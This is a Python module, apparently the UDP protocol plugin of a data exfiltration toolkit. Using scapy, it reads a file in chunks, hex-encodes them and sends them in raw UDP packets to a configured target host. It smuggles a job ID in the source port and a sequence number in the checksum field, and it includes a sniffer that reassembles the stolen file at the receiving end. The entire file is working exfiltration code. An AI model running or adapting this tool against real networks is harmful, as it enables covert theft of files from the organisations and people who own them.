import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, sniff, sendp, Raw
from scapy.layers.inet import UDP, IP

config = None
app_exfiltrate = None


def send(exfiltrate_file, file):
    target = config['target']
    port = config['port']
    num_bytes = config['num_bytes']

    app_exfiltrate.log_message('warning', "[!] Registering packet for the file")
    data = "%s" % os.path.basename(exfiltrate_file.file_to_send)

    packet_index = 0
    ether = Ether()
    ip = IP(dst=target)

    udp = UDP(dport=port, sport=exfiltrate_file.jobid, chksum=packet_index)
    pkt = ether / ip / udp / Raw(load=data)
    sendp(pkt, verbose=0)

    while True:
        packet_index += 1
        data_file = file.read(num_bytes).encode('hex')
        if not data_file:
            break
        # ok("Using {0} as transport method".format(protocol_name))

        app_exfiltrate.log_message('info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
        udp = UDP(dport=port, sport=exfiltrate_file.jobid, chksum=packet_index)
        pkt = ether / ip / udp / Raw(load=data_file)
        sendp(pkt, verbose=0)

    data = "DONE:%s" % exfiltrate_file.checksum
    udp = UDP(dport=port, sport=exfiltrate_file.jobid, chksum=packet_index)
    pkt = Ether() / ip / udp / Raw(load=data)
    sendp(pkt, verbose=0)


def listen():
    port = config['port']
    sniff(filter="udp and port " + str(port), prn=analyze)


def analyze(packet):
    udp = packet.getlayer(2)
    jobid = udp.fields['sport']
    packet_index = udp.fields['chksum']
    raw = packet.lastlayer()
    data = raw.fields['load']
    print('%s|%s|%s' % (jobid, packet_index, data))
    if packet_index == 0:
        app_exfiltrate.register_file(jobid, data)
    elif data[0:5] == 'DONE:':
        app_exfiltrate.retrieve_file(jobid, data[5:])
    else:
        app_exfiltrate.retrieve_data(jobid, packet_index, data)


class Protocol:
    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_protocol('udp', {'send': send, 'listen': listen})
